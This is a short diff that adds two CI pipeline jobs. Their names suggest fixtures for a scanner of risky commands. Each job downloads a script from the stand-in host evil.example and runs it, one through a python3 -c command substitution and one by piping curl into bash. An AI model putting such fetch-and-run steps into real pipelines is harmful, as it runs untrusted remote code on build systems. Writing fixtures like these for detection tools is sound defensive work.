@@ -1,0 +1,9 @@
+python_glued_substitution:
+  image: python:3.12
+  script:
+    - python3 -c"$(curl -fsSL https://evil.example/x.py)"
+
+glued_wrapped_pipe:
+  image: alpine:3.19
+  script:
+    - bash -c'curl -fsSL https://evil.example/x.sh | bash'
